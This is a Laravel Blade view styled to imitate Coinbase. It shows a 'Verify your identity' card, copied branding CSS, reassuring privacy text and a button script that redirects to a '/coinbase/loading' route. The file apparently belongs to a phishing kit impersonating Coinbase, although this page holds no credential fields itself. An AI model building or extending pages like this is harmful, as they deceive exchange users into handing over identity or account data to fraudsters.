@extends('user.coinbase.layout')

@section('title', 'Coinbase - Verify Identity')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button,
select {
  text-transform: none;
}

button,
input:where([type=button]),
input:where([type=reset]),
input:where([type=submit]) {
  -webkit-appearance: button;
  background-color: transparent;
  background-image: none;
}

button {
  height: auto;
  -webkit-appearance: button;
  font: inherit;
}

button,
[role=button] {
  cursor: pointer;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-coinbase-primary {
  --tw-bg-opacity: 1;
  background-color: rgb(87 139 250 / var(--tw-bg-opacity, 1));
}
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.gap-2 { gap: .5rem; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-12 { margin-top: 3rem; }
.my-4 { margin-top: 1rem; margin-bottom: 1rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pl-6 { padding-left: 1.5rem; }
.pr-8 { padding-right: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.py-4 { padding-top: 1rem; padding-bottom: 1rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-full { border-radius: 9999px; }
.text-\[28px\] { font-size: 28px; }
.text-black {
  --tw-text-opacity: 1;
  color: rgb(0 0 0 / var(--tw-text-opacity, 1));
}
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.transition-colors {
  transition-property: color,background-color,border-color,text-decoration-color,fill,stroke;
  transition-timing-function: cubic-bezier(.4,0,.2,1);
  transition-duration: .15s;
}
.w-full { width: 100%; }
.hover\:bg-\[\#507fe5\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(80 127 229 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#4b78d6\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(75 120 214 / var(--tw-bg-opacity, 1));
}
.active\:scale-\[\.98\]:active {
  --tw-scale-x: .98;
  --tw-scale-y: .98;
  transform: translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}

#cb-vi-btn .cb-vi-ext {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 22px;
  height: 22px;
  border-radius: 6px;
  background: rgba(0,0,0,.14);
  pointer-events: none;
  flex-shrink: 0;
}
#cb-vi-btn .cb-vi-ext svg {
  display: block;
  width: 12px;
  height: 12px;
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Verify your identity
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted my-4">
Please visit the following link to verify your identity. Your information will be deleted after verification and will not be shared with anyone.
</span>
<button id="cb-vi-btn" class="bg-coinbase-primary hover:bg-[#507fe5] active:bg-[#4b78d6] active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center gap-2" type="button">
Verify Identity
<span class="cb-vi-ext" aria-hidden="true">
<svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<path d="M14 5h5v5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
<path d="M13 11l6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
<path d="M19 13v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
</svg>
</span>
</button>
</form>
<script>
document.getElementById('cb-vi-btn').addEventListener('click', function() {
  document.documentElement.style.background = '#0a0b0d';
  document.body.style.background = '#0a0b0d';
  if (window.navigateTo) window.navigateTo('/coinbase/loading');
  else window.location.href = '/coinbase/loading';
});
</script>
@endsection
